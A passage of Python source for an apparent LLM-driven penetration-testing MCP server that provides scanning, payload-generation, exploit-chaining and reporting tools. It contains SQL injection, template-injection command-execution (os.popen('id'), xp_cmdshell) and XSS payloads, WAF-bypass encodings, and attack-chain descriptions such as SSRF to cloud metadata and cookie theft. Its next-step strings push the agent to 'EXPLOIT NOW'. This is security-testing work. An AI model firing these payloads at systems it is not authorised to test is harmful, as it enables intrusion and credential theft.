        ] if new_count else ["No static findings. MANUAL: extract and review the root filesystem, bootloader, and update mechanism."],
    }


@mcp.tool()
async def scan_websocket(
    session_id: str,
    websocket_urls: list[str] | None = None,
) -> dict[str, Any]:
    """Test WebSocket security: Cross-Site WebSocket Hijacking (CSWSH),
    authentication bypass, injection through WebSocket messages (SQLi/XSS/CMDi),
    insecure transport (ws:// vs wss://). Auto-discovers WebSocket endpoints
    from JavaScript files and upgrade probes."""
    session = _require_session(session_id)
    session.discovered.running_module = "scan_websocket"

    from pencheff.modules.advanced.websocket_security import WebSocketSecurityModule
    from pencheff.core.http_client import PencheffHTTPClient

    http = PencheffHTTPClient(session)
    try:
        mod = WebSocketSecurityModule()
        findings = await mod.run(session, http, targets=websocket_urls)
    finally:
        await http.close()
        session.discovered.running_module = None

    new_count = session.findings.add_many(findings)
    session.discovered.completed_modules.append("scan_websocket")

    next_steps = []
    if session.discovered.websocket_endpoints:
        next_steps.append(f"Found {len(session.discovered.websocket_endpoints)} WebSocket endpoints.")
    if new_count > 0:
        next_steps.append("WebSocket vulnerabilities found — chain CSWSH with session hijacking.")
    next_steps.append("Run scan_auth for traditional authentication testing.")

    return {
        "websocket_endpoints": [ep["url"] for ep in session.discovered.websocket_endpoints],
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "next_steps": next_steps,
    }


@mcp.tool()
async def scan_grpc(session_id: str) -> dict[str, Any]:
    """Deterministic gRPC probe: server-reflection enumeration + method discovery
    via grpcurl. No-op for non-gRPC targets. Mirrors scan_websocket as a
    first-party stage so gRPC targets get protocol-specific coverage even without
    the AI/breaker path (GrpcReflectionAgent). run_grpcurl auto-detects the
    transport (plaintext h2c vs TLS) and emits the reflection-exposed finding."""
    session = _require_session(session_id)
    from pencheff.artifact_tools import _kind_config_for_session

    cfg = _kind_config_for_session(session_id) or {}
    base = cfg.get("base_url") or session.target.base_url or ""
    is_grpc = cfg.get("kind") == "grpc" or base.startswith(("grpc://", "grpcs://"))
    if not is_grpc:
        return {"skipped": True, "reason": "not a gRPC target", "new_findings": 0}

    session.discovered.running_module = "scan_grpc"
    from pencheff.dast_protocol_tools import run_grpcurl

    before = session.findings.count
    services: list[str] = []
    methods: dict[str, int] = {}
    try:
        listing = await run_grpcurl(session_id, action="list")
        stdout = listing.get("stdout") or ""
        services = [
            s.strip() for s in stdout.splitlines()
            if s.strip() and not s.strip().startswith("grpc.reflection")
        ]
        # Method discovery — describe each non-reflection service.
        for svc in services[:10]:
            desc = await run_grpcurl(session_id, action="describe", service=svc)
            body = desc.get("stdout") or ""
            if body:
                methods[svc] = body.count("rpc ")
    finally:
        session.discovered.completed_modules.append("scan_grpc")
        session.discovered.running_module = None

    new_count = session.findings.count - before
    next_steps = []
    if services:
        next_steps.append(
            f"Reflection exposed {len(services)} service(s): {', '.join(services[:5])}. "
            "Enable AI to fuzz methods and probe metadata auth (GrpcReflectionAgent)."
        )
    return {
        "new_findings": new_count,
        "services": services[:50],
        "methods_per_service": methods,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "next_steps": next_steps,
    }


@mcp.tool()
async def scan_mfa_bypass(
    session_id: str,
    login_url: str | None = None,
    mfa_url: str | None = None,
) -> dict[str, Any]:
    """Test 2FA/MFA bypass techniques: direct endpoint access (skip 2FA step),
    OTP brute force (rate limiting check), backup code abuse, response manipulation,
    race condition on code validation."""
    session = _require_session(session_id)
    session.discovered.running_module = "scan_mfa_bypass"

    from pencheff.modules.auth.mfa_bypass import MFABypassModule
    from pencheff.core.http_client import PencheffHTTPClient

    http = PencheffHTTPClient(session)
    try:
        mod = MFABypassModule()
        config = {}
        if login_url:
            config["login_url"] = login_url
        if mfa_url:
            config["mfa_url"] = mfa_url
        findings = await mod.run(session, http, config=config or None)
    finally:
        await http.close()
        session.discovered.running_module = None

    new_count = session.findings.add_many(findings)
    session.discovered.completed_modules.append("scan_mfa_bypass")

    next_steps = []
    if new_count > 0:
        next_steps.append(f"Found {new_count} MFA bypass vulnerabilities — these are critical auth weaknesses.")
    next_steps.append("Run scan_auth for session management and JWT testing.")
    next_steps.append("Run exploit_chain_suggest to build auth bypass attack chains.")

    return {
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "next_steps": next_steps,
    }


@mcp.tool()
async def scan_oauth(
    session_id: str,
    oauth_endpoint: str | None = None,
    types: list[str] | None = None,
) -> dict[str, Any]:
    """Test OAuth/OIDC implementation security: redirect_uri manipulation and bypass,
    state parameter validation, token leakage via Referer, scope escalation, PKCE
    bypass. Auto-discovers OAuth endpoints if not provided."""
    session = _require_session(session_id)
    session.discovered.running_module = "scan_oauth"

    from pencheff.modules.auth.oauth_attacks import OAuthAttackModule
    from pencheff.core.http_client import PencheffHTTPClient

    http = PencheffHTTPClient(session)
    try:
        mod = OAuthAttackModule()
        config = {"oauth_endpoint": oauth_endpoint} if oauth_endpoint else None
        findings = await mod.run(session, http, config=config)
    finally:
        await http.close()
        session.discovered.running_module = None

    new_count = session.findings.add_many(findings)
    session.discovered.completed_modules.append("scan_oauth")

    next_steps = []
    if session.discovered.oauth_endpoints:
        next_steps.append(f"Found {len(session.discovered.oauth_endpoints)} OAuth endpoints.")
    if new_count > 0:
        next_steps.append("OAuth vulnerabilities found — chain with open redirect for token theft.")
    next_steps.append("Run scan_auth for session management and JWT testing.")
    next_steps.append("Run scan_mfa_bypass if 2FA is implemented.")

    return {
        "oauth_endpoints": session.discovered.oauth_endpoints,
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "next_steps": next_steps,
    }


# ─── Intelligence Tools ──────────────────────────────────────────────


@mcp.tool()
async def exploit_chain_suggest(session_id: str) -> dict[str, Any]:
    """Analyze all findings and suggest exploit chains that combine vulnerabilities
    for maximum impact. Returns ranked attack paths with step-by-step exploitation
    instructions. Run after completing scans to identify critical attack narratives."""
    session = _require_session(session_id)

    # Chain rules: (required_finding_categories, chain_name, description, combined_cvss)
    CHAIN_RULES = [
        (
            ["ssrf", "cloud"],
            "SSRF → Cloud Metadata → Credential Theft",
            "Exploit SSRF to access cloud metadata service (169.254.169.254), steal IAM credentials, and achieve full cloud account compromise.",
            9.8,
        ),
        (
            ["xss", "auth"],
            "XSS → Session Hijacking → Account Takeover",
            "Use XSS to steal session tokens via document.cookie, then hijack authenticated sessions for full account takeover.",
            9.1,
        ),
        (
            ["open_redirect", "oauth"],
            "Open Redirect → OAuth Token Theft",
            "Chain open redirect with OAuth redirect_uri bypass to steal authorization codes or access tokens.",
            9.1,
        ),
        (
            ["injection", "auth"],
            "SQL Injection → Credential Dump → Admin Access",
            "Extract credentials via SQLi, crack password hashes, and gain admin access. If passwords are reused, lateral movement is possible.",
            9.8,
        ),
        (
            ["file_handling", "injection"],
            "File Upload → Path Traversal → RCE",
            "Upload a web shell bypassing extension filters, use path traversal to place it in an executable directory, achieve Remote Code Execution.",
            9.8,
        ),
        (
            ["smuggling", "cache_poisoning"],
            "HTTP Smuggling → Cache Poisoning → Mass Compromise",
            "Use request smuggling to desync front-end/back-end, poison the cache with malicious content served to all users.",
            9.1,
        ),
        (
            ["prototype_pollution", "xss"],
            "Prototype Pollution → XSS Gadget → Stored XSS",
            "Pollute Object.prototype to trigger XSS via framework gadgets (jQuery, Lodash), achieving persistent cross-site scripting.",
            8.1,
        ),
        (
            ["idor", "authz"],
            "IDOR → PII Exposure → Data Breach",
            "Exploit IDOR to enumerate and access other users' personal data, constituting a reportable data breach.",
            8.1,
        ),
        (
            ["mfa_bypass", "auth"],
            "MFA Bypass → Authentication Bypass → Full Access",
            "Bypass 2FA via direct endpoint access or OTP brute force, gaining full authenticated access without the second factor.",
            9.1,
        ),
        (
            ["cors", "xss"],
            "CORS Misconfiguration → Cross-Origin Data Theft",
            "Exploit CORS wildcard or reflected origin to read authenticated API responses cross-origin, stealing sensitive data.",
            7.5,
        ),
        (
            ["subdomain_takeover"],
            "Subdomain Takeover → Phishing/Cookie Theft",
            "Claim the dangling subdomain, serve a phishing page or steal cookies scoped to the parent domain.",
            7.5,
        ),
        (
            ["deserialization"],
            "Insecure Deserialization → Remote Code Execution",
            "Exploit deserialization vulnerability with gadget chain payload to achieve arbitrary code execution on the server.",
            9.8,
        ),
        (
            ["websocket", "auth"],
            "WebSocket Hijacking → Real-time Data Theft",
            "Exploit CSWSH to hijack authenticated WebSocket connections, intercepting real-time data streams.",
            8.1,
        ),
        (
            ["mass_assignment", "authz"],
            "Mass Assignment → Privilege Escalation",
            "Inject admin role via mass assignment, escalate from regular user to administrator.",
            8.1,
        ),
    ]

    all_findings = session.findings.get_all()
    finding_categories = {f.category for f in all_findings}

    chains = []
    for required_cats, chain_name, description, combined_cvss in CHAIN_RULES:
        matching = [cat for cat in required_cats if cat in finding_categories]
        if len(matching) == len(required_cats):
            # Find the specific findings that form this chain
            chain_findings = [
                f for f in all_findings if f.category in required_cats
            ]
            chains.append({
                "chain_name": chain_name,
                "description": description,
                "combined_cvss": combined_cvss,
                "required_categories": required_cats,
                "matched_categories": matching,
                "supporting_findings": [
                    {"id": f.id, "title": f.title, "severity": f.severity.value, "endpoint": f.endpoint}
                    for f in chain_findings[:5]
                ],
                "exploitation_steps": description,
            })

    # Sort by combined CVSS
    chains.sort(key=lambda c: c["combined_cvss"], reverse=True)

    # Store in session
    session.discovered.exploit_chains = chains
    session.discovered.completed_modules.append("exploit_chain_suggest")

    next_steps = []
    if chains:
        next_steps.append(f"EXPLOIT NOW: {len(chains)} exploit chains identified. You MUST use test_chain to demonstrate the top chains as working PoCs.")
        next_steps.append(f"HIGHEST PRIORITY: '{chains[0]['chain_name']}' (CVSS {chains[0]['combined_cvss']}) — build a multi-step test_chain PoC for this.")
        if len(chains) > 1:
            next_steps.append(f"ALSO VERIFY: '{chains[1]['chain_name']}' — build a second PoC with test_chain.")
        next_steps.append("For each chain: define test_chain steps with extract fields to pass tokens/IDs between steps.")
    else:
        next_steps.append("No automatic chains found. MANUALLY build attack chains with test_chain using your findings.")
    next_steps.append("Run generate_report — include verified chain PoCs as the centerpiece of the report.")

    return {
        "chains_found": len(chains),
        "chains": chains,
        "total_findings": session.findings.count,
        "next_steps": next_steps,
    }


@mcp.tool()
async def payload_generate(
    session_id: str,
    attack_type: str,
    context: dict | None = None,
) -> dict[str, Any]:
    """Generate context-aware payloads optimized for the target's tech stack and WAF.
    Uses discovered technology fingerprints and WAF detection results to produce
    payloads with the highest chance of success. Attack types: sqli, xss, ssti,
    cmdi, xxe, ssrf, ldap, open_redirect, waf_bypass, smuggling, deserialization."""
    session = _require_session(session_id)

    from pencheff.core.payload_loader import load_payloads

    tech_stack = context or session.discovered.tech_stack
    waf_info = session.discovered.waf_detected

    # Base payloads from files
    payload_files = {
        "sqli": "sqli.txt", "xss": "xss.txt", "ssti": "ssti.txt",
        "cmdi": "cmdi.txt", "xxe": "xxe.txt", "ssrf": "ssrf.txt",
        "ldap": "ldap.txt", "open_redirect": "open_redirect.txt",
        "waf_bypass": "waf_bypass.txt", "smuggling": "smuggling.txt",
        "deserialization": "deserialization.txt", "path_traversal": "path_traversal.txt",
        "prototype_pollution": "prototype_pollution.txt",
    }

    filename = payload_files.get(attack_type, f"{attack_type}.txt")
    base_payloads = load_payloads(filename)

    if not base_payloads:
        return {"error": f"No payloads found for attack type: {attack_type}", "payloads": []}

    # Tech-stack-aware mutations
    optimized = list(base_payloads)
    tech_additions: list[str] = []

    all_techs = []
    for techs in (tech_stack.values() if isinstance(tech_stack, dict) else []):
        all_techs.extend([t.lower() for t in techs])
    tech_str = " ".join(all_techs)

    if attack_type == "sqli":
        if "mysql" in tech_str:
            tech_additions.extend([
                "' AND SLEEP(5)-- -",
                "' UNION SELECT NULL,@@version,NULL-- -",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -",
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))-- -",
            ])
        elif "postgres" in tech_str or "postgresql" in tech_str:
            tech_additions.extend([
                "'; SELECT pg_sleep(5)--",
                "' UNION SELECT NULL,version(),NULL--",
                "' AND 1=CAST((SELECT version()) AS int)--",
            ])
        elif "mssql" in tech_str or "sql server" in tech_str:
            tech_additions.extend([
                "'; WAITFOR DELAY '00:00:05'--",
                "' UNION SELECT NULL,@@version,NULL--",
                "'; EXEC xp_cmdshell('whoami')--",
            ])

    elif attack_type == "ssti":
        if "jinja" in tech_str or "flask" in tech_str or "python" in tech_str:
            tech_additions.extend([
                "{{config}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
            ])
        elif "twig" in tech_str or "php" in tech_str or "symfony" in tech_str:
            tech_additions.extend([
                "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
                "{{['id']|filter('system')}}",
            ])
        elif "freemarker" in tech_str or "java" in tech_str:
            tech_additions.extend([
                '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
                '${T(java.lang.Runtime).getRuntime().exec("id")}',
            ])

    elif attack_type == "xss":
        if "angular" in tech_str:
            tech_additions.extend([
                "{{constructor.constructor('alert(1)')()}}",
                "<div ng-app ng-csp><script>alert(1)</script></div>",
            ])
        elif "react" in tech_str:
            tech_additions.extend([
                "javascript:alert(1)//",
                "<img src=x onerror='alert(1)'>",
            ])

    # WAF bypass encoding if WAF detected
    if waf_info and waf_info.get("vendor"):
        waf_vendor = waf_info["vendor"].lower()
        bypass_payloads = []

        for payload in (base_payloads + tech_additions)[:10]:
            # Double URL encoding
            import urllib.parse
            double_encoded = urllib.parse.quote(urllib.parse.quote(payload))
            bypass_payloads.append(double_encoded)

            # Case variation (for string-based WAF rules)
            if "<script>" in payload.lower():
                bypass_payloads.append(payload.replace("<script>", "<ScRiPt>").replace("</script>", "</ScRiPt>"))

            # Comment injection for SQL
            if "' OR" in payload or "' AND" in payload:
                bypass_payloads.append(payload.replace(" OR ", "/**/OR/**/").replace(" AND ", "/**/AND/**/"))

        tech_additions.extend(bypass_payloads)

    optimized.extend(tech_additions)

    # Deduplicate
    seen = set()
    unique_payloads = []
    for p in optimized:
        if p not in seen:
            seen.add(p)
            unique_payloads.append(p)

    return {
        "attack_type": attack_type,
        "tech_context": tech_str[:200] if tech_str else "none detected",
        "waf_context": waf_info.get("vendor", "none") if waf_info else "none",
        "total_payloads": len(unique_payloads),
        "base_payloads": len(base_payloads),
        "tech_specific_additions": len(tech_additions),
        "payloads": unique_payloads[:100],
        "next_steps": [
            f"Use these {len(unique_payloads)} payloads with test_endpoint for targeted testing.",
            "Run scan_injection or scan_client_side with optimized payloads.",
        ],
    }


# ─── Targeted Testing ─────────────────────────────────────────────────


@mcp.tool()
async def test_endpoint(
    session_id: str,
    method: str,
    url: str,
    headers: dict | None = None,
    body: str | dict | list | None = None,
    payloads: list[str] | None = None,
    follow_redirects: bool = True,
) -> dict[str, Any]:
    """Run a targeted test against a specific endpoint. Use for manual/custom testing
    or to follow up on a finding. Body accepts strings or JSON objects (dicts/lists —
    auto-serialized). If payloads provided, sends one request per payload
    substituted into the body/URL via the PENCHEFF placeholder."""
    session = _require_session(session_id)

    import json as _json
    from pencheff.core.http_client import PencheffHTTPClient

    # Auto-serialize dict/list body to JSON string
    if isinstance(body, (dict, list)):
        body = _json.dumps(body)
        if headers is None:
            headers = {}
        headers.setdefault("Content-Type", "application/json")

    http = PencheffHTTPClient(session)
    results = []

    try:
        if payloads:
            for payload in payloads[:50]:  # cap at 50
                test_url = url.replace("PENCHEFF", payload)
                test_body = body.replace("PENCHEFF", payload) if body else None
                resp = await http.request(
                    method, test_url, headers=headers, body=test_body,
                    follow_redirects=follow_redirects, module="test_endpoint",
                )
                results.append({
                    "payload": payload,
                    "status": resp.status_code,
                    "length": len(resp.content),
                    "headers": dict(resp.headers),
                    "body_snippet": resp.text[:500],
                })
        else:
            resp = await http.request(
                method, url, headers=headers, body=body,
                follow_redirects=follow_redirects, module="test_endpoint",
            )
            results.append({
                "status": resp.status_code,
                "length": len(resp.content),
                "headers": dict(resp.headers),
                "body_snippet": resp.text[:1000],
            })
    finally:
        await http.close()

    return {"results": results, "request_count": len(results)}


@mcp.tool()
async def test_chain(session_id: str, steps: list[dict]) -> dict[str, Any]:
    """Execute a chain of requests for multi-step attack scenarios.
    Each step: {method, url, headers?, body?, extract?: {var_name: jsonpath}}.
    Variables from previous steps can be referenced as {{var_name}} in subsequent steps."""
    session = _require_session(session_id)

    from pencheff.core.http_client import PencheffHTTPClient
    import json
    import re

    http = PencheffHTTPClient(session)
    variables: dict[str, str] = {}
    results = []

    def substitute(text: str) -> str:
        if not text:
            return text
        for key, val in variables.items():
            text = text.replace(f"{{{{{key}}}}}", val)
        return text

    def extract_jsonpath_simple(data: Any, path: str) -> str | None:
        """Simple JSONPath-like extraction: $.key.subkey"""
        parts = path.lstrip("$.").split(".")
        current = data
        for part in parts:
            if isinstance(current, dict) and part in current:
                current = current[part]
            else:
                return None
        return str(current)

    try:
        for i, step in enumerate(steps):
            method = step.get("method", "GET")
            url = substitute(step["url"])
            headers = {k: substitute(v) for k, v in step.get("headers", {}).items()}
            raw_body = step.get("body", "")
            # Auto-serialize dict/list bodies to JSON
            if isinstance(raw_body, (dict, list)):
                raw_body = json.dumps(raw_body)
                headers.setdefault("Content-Type", "application/json")
            body = substitute(raw_body) if isinstance(raw_body, str) else raw_body

            resp = await http.request(
                method, url, headers=headers or None,
                body=body or None, module="test_chain",
            )

            step_result = {
                "step": i + 1,
                "status": resp.status_code,
                "length": len(resp.content),
                "body_snippet": resp.text[:500],
            }

            # Extract variables for next steps
            extractions = step.get("extract", {})
            if extractions:
                try:
                    resp_json = resp.json()
                except Exception:
                    resp_json = {}
                for var_name, path in extractions.items():
                    val = extract_jsonpath_simple(resp_json, path)
                    if val:
                        variables[var_name] = val
                        step_result[f"extracted_{var_name}"] = val

            results.append(step_result)
    finally:
        await http.close()

    return {"steps": results, "variables": variables}


@mcp.tool()
async def analyze_response(
    session_id: str,
    url: str,
    response_status: int,
    response_headers: dict,
    response_body: str,
) -> dict[str, Any]:
    """Analyze an HTTP response for security issues: information disclosure,
    error messages, sensitive data in headers/body, technology fingerprints."""
    session = _require_session(session_id)
    issues = []

    # Check for information disclosure in headers
    sensitive_headers = ["server", "x-powered-by", "x-aspnet-version", "x-aspnetmvc-version"]
    for h in sensitive_headers:
        if h in {k.lower(): v for k, v in response_headers.items()}:
            issues.append({
                "type": "info_disclosure",
                "detail": f"Header '{h}' reveals server technology",
                "severity": "low",
            })

    # Check for error messages / stack traces
    error_patterns = [
        "stack trace", "traceback", "exception", "error in",
        "syntax error", "warning:", "fatal error", "debug",
        "mysql_", "pg_", "sqlite_", "ORA-", "SQLSTATE",
    ]
    body_lower = response_body.lower()
    for pattern in error_patterns:
        if pattern.lower() in body_lower:
            issues.append({
                "type": "error_disclosure",
                "detail": f"Response contains '{pattern}' — possible information leakage",
                "severity": "medium",
            })

    # Check for sensitive data patterns
    import re
    sensitive_patterns = {
        "email": r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}",
        "ip_address": r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b",
        "aws_key": r"AKIA[0-9A-Z]{16}",
        "jwt_token": r"eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+",
    }
    for name, pattern in sensitive_patterns.items():
        matches = re.findall(pattern, response_body)
        if matches:
            issues.append({
                "type": "sensitive_data",
                "detail": f"Found {len(matches)} potential {name} pattern(s)",
                "severity": "medium" if name in ("aws_key", "jwt_token") else "info",
            })

    # Security headers check
    header_keys = {k.lower() for k in response_headers}
    missing_security = []
    for h in ["strict-transport-security", "content-security-policy", "x-content-type-options", "x-frame-options"]:
        if h not in header_keys:
            missing_security.append(h)
    if missing_security:
        issues.append({
            "type": "missing_headers",
            "detail": f"Missing security headers: {', '.join(missing_security)}",
            "severity": "low",
        })

    return {
        "url": url,
        "status": response_status,
        "issues_found": len(issues),
        "issues": issues,
    }


# ─── Orchestrator-internal helpers (NOT @mcp.tool — not exposed to LLM) ───────
# These are plain async functions called only by the agent_swarm orchestrator.
# Keeping them out of the MCP tool registry is intentional: the LLM must never
# be able to invoke them directly.


async def import_endpoints(
    *, session_id: str, endpoints: list[dict],
) -> dict:
    """Bulk-load discovered endpoints into the session's discovered-endpoint list.

    Each entry: {"url", "method", "status", "content_type", "parameters"}.
    Used by the agent_swarm orchestrator to seed isolated breaker sessions
    from a frozen ReconSnapshot — saves each breaker from re-crawling.

    Adaption note: PentestSession.discovered.endpoints is a list[dict], not a
    dedicated DiscoveredEndpoints registry. Entries are appended directly.
    """
    s = _require_session(session_id)
    count = 0
    for ep in endpoints:
        url = ep.get("url")
        if not url:
            continue
        s.discovered.endpoints.append({
            "url": url,
            "method": ep.get("method", "GET"),
            "status": ep.get("status"),
            "content_type": ep.get("content_type"),
            "parameters": list(ep.get("parameters") or []),
        })
        count += 1
    return {"imported": count}


async def set_auth_state(
    *, session_id: str,
    cookies: list[tuple[str, str]] | None = None,
    tokens: dict[str, str] | None = None,
) -> dict:
    """Inject an authenticated session state without going through login.

    Used by the agent_swarm orchestrator after ReconAgent's
    authenticated_crawl succeeds: subsequent breaker sessions inherit
    the auth bundle without each having to log in again.

    Adaption note: PentestSession has no s.session sub-object. Auth state is
    stored on dedicated orchestrator fields (auth_cookies, auth_tokens,
    authenticated) added to PentestSession for this purpose.
    """
    s = _require_session(session_id)
    if cookies:
        s.auth_cookies.extend(cookies)
    if tokens:
        s.auth_tokens.update(tokens)
    s.authenticated = bool(s.auth_cookies or s.auth_tokens)
    return {"authenticated": s.authenticated}


async def attach_oast(
    *, session_id: str, handle: str,
) -> dict:
    """Reuse an existing OAST callback infrastructure handle.

    ReconAgent calls oast_init once on the master session; the
    orchestrator passes that handle into each breaker session via this
    helper so all OAST callbacks land in the same poll buffer.

    Adaption note: PentestSession has no s.oast sub-object. The handle is
    stored on the dedicated orchestrator field oast_handle.
    """
    s = _require_session(session_id)
    s.oast_handle = handle
    return {"attached": True}


async def copy_finding(
    *, src_session: str, dst_session: str,
    finding_id: str, tag: dict | None = None,
) -> dict:
    """Copy one finding from src into dst, optionally tagging metadata.

    Used by the agent_swarm orchestrator's merge step to union breaker
    findings into the master session before ChainAgent runs.

    Adaption note: FindingsDB exposes get_by_id() for lookup and add() for
    insertion. The list attribute is _findings (private); direct append is
    used to bypass dedup so cross-session copies are always preserved.
    """
    import copy as _copy
    src = _require_session(src_session)
    dst = _require_session(dst_session)
    found = src.findings.get_by_id(finding_id)
    if found is None:
        return {"copied": False, "error": f"finding {finding_id!r} not found in source"}
    cloned = _copy.copy(found)
    # Assign a fresh ID so the copy is independent of the original.
    import uuid as _uuid
    cloned.id = _uuid.uuid4().hex[:12]
    if tag:
        cloned.metadata = dict(cloned.metadata or {})
        cloned.metadata.update(tag)
    # Bypass dedup: use add_force so the finding is always preserved
    # regardless of the destination's dedup state.
    dst.findings.add_force(cloned)
    return {"copied": True, "new_id": cloned.id}


async def pentest_destroy(*, session_id: str) -> dict:
    """Remove a session from in-memory storage. Used by the agent_swarm
    orchestrator to release per-breaker pencheff sessions after the
    merge step. Idempotent: returns destroyed=False if the session has
    already been released or never existed."""
    from pencheff.core.session import _sessions
    existed = session_id in _sessions
    _sessions.pop(session_id, None)
    return {"destroyed": existed}


# ─── Reporting ─────────────────────────────────────────────────────────


@mcp.tool()
async def get_findings(
    session_id: str,
    severity: str | None = None,
    category: str | None = None,
    owasp_category: str | None = None,
) -> dict[str, Any]:
    """Retrieve all findings, optionally filtered by severity, category, or OWASP category.
    Returns structured finding data with CVSS scores."""
    session = _require_session(session_id)
    sev = Severity(severity) if severity else None
    findings = session.findings.get_all(severity=sev, category=category, owasp_category=owasp_category)
    return {
        "count": len(findings),
        "summary": session.findings.summary(),
        "findings": [f.to_dict() for f in findings],
    }


@mcp.tool()
async def generate_report(
    session_id: str,
    report_type: str = "full",
    format: str = "markdown",
    compliance_frameworks: list[str] | None = None,
) -> dict[str, Any]:
    """Generate a penetration test report. Types: executive, technical, full.
    Formats: markdown, json. Includes CVSS scores, OWASP mapping, remediation, compliance."""
    session = _require_session(session_id)

    from pencheff.reporting.renderer import render_report

    report = render_report(
        session=session,
        report_type=report_type,
        output_format=format,
        compliance_frameworks=compliance_frameworks or ["owasp", "pci-dss", "nist"],
    )

    session.discovered.completed_modules.append("generate_report")

    return {
        "report_type": report_type,
        "format": format,
        "content": report,
    }


@mcp.tool()
async def export_report(
    session_id: str,
    formats: list[str] | None = None,
    report_type: str = "full",
    output_dir: str | None = None,
) -> dict[str, Any]:
    """Export pentest report to Word (.docx), CSV, and JSON files.

    Each format includes:
    - Word (.docx): Full formatted report with severity colors, tables, compliance mapping,
      verification status, remediation roadmap — ready to share with stakeholders.
    - CSV: Flat row-per-finding with all fields including verification_status
      (true_positive, false_positive, true_negative, false_negative, unverified),
      CVSS scores, compliance mappings — ready for import into tracking systems.
    - JSON: Structured findings with full evidence, compliance, and verification details.

    Files are saved to output_dir (default: ~/pencheff-reports/<session_id>/).
    Use verify_finding to set verification_status on findings before exporting."""
    session = _require_session(session_id)

    from pencheff.reporting.exporter import export_all, export_docx, export_csv, export_json

    fmt_list = formats or ["docx", "csv", "json"]
    results = {}

    out_dir = output_dir

    for fmt in fmt_list:
        if fmt == "docx":
            results["docx"] = export_docx(session, report_type=report_type, output_dir=out_dir)
        elif fmt == "csv":
            results["csv"] = export_csv(session, output_dir=out_dir)
        elif fmt == "json":
            results["json"] = export_json(session, output_dir=out_dir)

    session.discovered.completed_modules.append("export_report")

    return {
        "exported_files": results,
        "formats": list(results.keys()),
        "finding_count": session.findings.count,
        "next_steps": [
            "Files have been saved — share the Word report with stakeholders.",
            "Import the CSV into your vulnerability tracking system (Jira, Linear, etc.).",
            "Use the JSON file for programmatic analysis or integration with CI/CD.",
        ],
    }


@mcp.tool()
async def verify_finding(
    session_id: str,
    finding_id: str,
    status: str,
    notes: str = "",
) -> dict[str, Any]:
    """Set the verification status of a finding.

    Status must be one of: true_positive, false_positive, true_negative, false_negative, unverified.

    Use this after test_endpoint verification to mark findings as confirmed (true_positive)
    or debunked (false_positive). This status is included in all exports (Word, CSV, JSON)."""
    from pencheff.config import VerificationStatus

    session = _require_session(session_id)

    valid_statuses = [s.value for s in VerificationStatus]
    if status not in valid_statuses:
        return {"error": f"Invalid status '{status}'. Must be one of: {', '.join(valid_statuses)}"}

    # Find the finding
    target_finding = None
    for f in session.findings.get_all():
        if f.id == finding_id:
            target_finding = f
            break

    if not target_finding:
        return {"error": f"Finding '{finding_id}' not found. Use get_findings to list finding IDs."}

    target_finding.verification_status = VerificationStatus(status)
    target_finding.verification_notes = notes

    return {
        "finding_id": finding_id,
        "title": target_finding.title,
        "verification_status": status,
        "verification_notes": notes,
        "next_steps": [
            "Continue verifying other findings with test_endpoint + verify_finding.",
            "Once all findings are verified, use export_report to generate final deliverables.",
        ],
    }


@mcp.tool()
async def exploit_finding(
    session_id: str,
    finding_id: str,
) -> dict[str, Any]:
    """Actively exploit a finding and stamp the captured proof onto its evidence.

    Dispatches to a category-specific playbook (clickjacking PoC, header capture,
    rate-limit burst, SQLi/XSS/SSRF triggers, etc.). For each finding category we
    define what "exploitation" means and produce a real captured artifact:

    - Missing security headers (clickjacking, content-type, CSP, referrer,
      permissions): re-fetch the endpoint, confirm the header is absent, build
      a PoC describing the attack the missing header enables.
    - Info disclosure (server / x-powered-by): re-fetch, capture the exposed
      header value verbatim as evidence.
    - Missing rate limiting: burst-send N requests and capture the timing /
      response codes to prove no throttling occurred.
    - SQL injection / XSS / SSRF / IDOR (when discovered): send the actual
      crafted payload, capture the diff (DB error message, reflected payload,
      OOB callback, cross-tenant data).
    - DNS findings (SPF / DMARC): dig the record, prove absence.

    Appends a new Evidence entry to the finding's `evidence` list. Sets
    verification_status = true_positive on a confirmed exploit, false_positive
    when the exploit cannot be reproduced. Returns the captured evidence so
    the agent can quote it in the report.
    """
    from pencheff.config import Severity, VerificationStatus
    from pencheff.core.findings import Evidence
    from pencheff.core.http_client import PencheffHTTPClient

    session = _require_session(session_id)

    target_finding = None
    for f in session.findings.get_all():
        if f.id == finding_id:
            target_finding = f
            break
    if not target_finding:
        return {"error": f"Finding '{finding_id}' not found. Use get_findings to list finding IDs."}

    title = (target_finding.title or "").lower()
    category = (target_finding.category or "").lower()
    endpoint = target_finding.endpoint or ""
    http = PencheffHTTPClient(session)

    # ── Header-fetch helper (used by every header-related playbook) ─────────
    async def _fetch_headers(url: str, method: str = "GET") -> tuple[Any, dict[str, str]]:
        resp = await http.request(method, url, module="exploit_finding")
        # PencheffHTTPClient response objects expose .headers as a Mapping; coerce.
        try:
            headers = {k.lower(): v for k, v in dict(resp.headers).items()}
        except Exception:
            headers = {}
        return resp, headers

    def _append_evidence(
        method: str,
        url: str,
        description: str,
        response_status: int | None = None,
        response_headers: dict[str, str] | None = None,
        body_snippet: str | None = None,
        request_headers: dict[str, str] | None = None,
        request_body: str | None = None,
    ) -> None:
        target_finding.evidence.append(Evidence(
            request_method=method,
            request_url=url,
            request_headers=request_headers or {},
            request_body=request_body,
            response_status=response_status,
            response_headers=response_headers or {},
            response_body_snippet=body_snippet,
            description=description,
        ))

    confirmed: bool = False
    exploit_result: dict[str, Any] = {}
    # Generic fallback evidence cap — Evidence.description should stay readable.
    EVIDENCE_DESC_MAX = 1500

    try:
        # ── Clickjacking / missing frame protection ─────────────────────────
        if "clickjacking" in title or "x-frame-options" in title or "frame protection" in title:
